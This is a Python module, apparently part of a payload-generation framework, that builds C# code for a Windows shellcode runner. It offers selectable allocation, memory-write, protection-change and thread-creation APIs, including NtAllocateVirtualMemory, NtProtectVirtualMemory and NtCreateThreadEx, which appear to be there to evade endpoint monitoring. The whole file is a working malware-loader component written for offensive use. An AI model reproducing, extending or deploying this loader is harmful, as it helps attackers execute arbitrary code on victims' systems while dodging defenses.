from string import Template
from common.utils.argumentparser import ArgumentParser

class shellcoderunner:
    def __init__(self, arguments):
        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='allocate', default='VirtualAlloc', help='Function used for allocating memory', choices={'VirtualAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx'})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': '0x20', 'rwx':'0x40'})
        parser.add_argument(name='copy', default='memcpy', help='Function used for copying memory', choices={'memcpy', 'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='protect', default='VirtualProtect', help='Function used for changing memory protections', choices={'VirtualProtect', 'NtProtectVirtualMemory'})
        parser.add_argument(name='execute', default='CreateThread', help='Function used for executing shellcode', choices={'CreateThread', 'NtCreateThreadEx'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish', choices={'WaitForSingleObject', 'NtWaitForSingleObject'})
        self.args = parser.parse_args(arguments)     

    def imports(self) -> list[str]:
        return ["using System;", 
                "using System.Collections.Generic;", 
                "using System.Linq;", 
                "using System.Text;", 
                "using System.Threading.Tasks;", 
                "using System.Diagnostics;", 
                "using System.Runtime.InteropServices;"]

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:

        template = """
            {transformers}
"""

        if self.args['allocate'] == 'VirtualAlloc':
            template += """
            IntPtr addr = {VirtualAlloc}(IntPtr.Zero, (ulong)shellcode.Length, 0x3000, 0x04);
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
            IntPtr addr = IntPtr.Zero;
            IntPtr regionSize = new IntPtr(shellcode.Length); 
            {NtAllocateVirtualMemory}((IntPtr)(-1), out addr, 0, ref regionSize, 0x3000, 0x04);
"""
        elif self.args['allocate'] == 'VirtualAllocEx':
            template += """
            IntPtr addr = {VirtualAllocEx}((IntPtr)(-1), IntPtr.Zero, (ulong)shellcode.Length, 0x3000, 0x04);
            Console.WriteLine(addr);
"""

        if self.args['copy'] == 'memcpy':
            template += """
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
"""
        elif self.args['copy'] == 'NtWriteVirtualMemory':
            template += """
            IntPtr numBytes = new IntPtr(shellcode.Length); 
            IntPtr numWritten = IntPtr.Zero;
            {NtWriteVirtualMemory}((IntPtr)(-1), addr, shellcode, ref numBytes, out numWritten);
"""
        elif self.args['copy'] == 'WriteProcessMemory':
            template += """
            IntPtr bytesWritten;
            {WriteProcessMemory}((IntPtr)(-1), addr, shellcode, (ulong)shellcode.Length, out bytesWritten);
"""

        if self.args['protect'] == 'VirtualProtect':
            template += Template("""
            IntPtr oldProtect;
            {VirtualProtect}(addr, (ulong)shellcode.Length, $perm, out oldProtect);
""").substitute(perm = self.args['perm'])
        elif self.args['protect'] == 'NtProtectVirtualMemory':
            template += Template("""
            IntPtr oldProtect = IntPtr.Zero;
            IntPtr regSize = new IntPtr(shellcode.Length); 
            {NtProtectVirtualMemory}((IntPtr)(-1), ref addr, ref regSize, $perm, out oldProtect);
""").substitute(perm = self.args['perm'])

        if self.args['execute'] == 'CreateThread':
            template += """
            IntPtr hThread = {CreateThread}(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
"""
        elif self.args['execute'] == 'NtCreateThreadEx':
            template += """
            IntPtr hThread = IntPtr.Zero;
            {NtCreateThreadEx}(out hThread, 0x001FFFFF, IntPtr.Zero, (IntPtr)(-1), addr, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero );
"""

        if self.args['wait'] == 'WaitForSingleObject':
            template += """
            {WaitForSingleObject}(hThread, 0xFFFFFFFF);
"""
        elif self.args['wait'] == 'NtWaitForSingleObject':
            template += """
            {NtWaitForSingleObject}(hThread, false, IntPtr.Zero);
"""

        return template